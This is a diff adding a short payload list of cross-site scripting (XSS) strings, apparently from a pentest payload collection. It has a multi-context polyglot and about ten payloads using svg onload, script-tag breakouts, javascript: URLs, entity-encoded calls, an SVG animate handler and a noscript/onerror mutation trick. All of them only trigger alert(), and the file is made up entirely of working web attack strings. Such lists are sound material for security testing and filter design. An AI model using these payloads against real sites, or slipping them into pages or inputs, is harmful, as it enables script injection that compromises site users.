@@ -1,0 +1,12 @@
+# xss/polyglot — break out of multiple contexts in a single string
+# The classic "0xsobotka" / "Ksuminecz" lineage of polyglots, paraphrased.
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"><svg onload=alert(1)>
+'-alert(1)-'
+\";alert(1);//
+</script><script>alert(1)</script>
+<a href=javascript:%0Aalert(1)>x</a>
+<svg><script>alert&#40;1&#41;</script>
+<svg><script>alert&lpar;1&rpar;</script>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
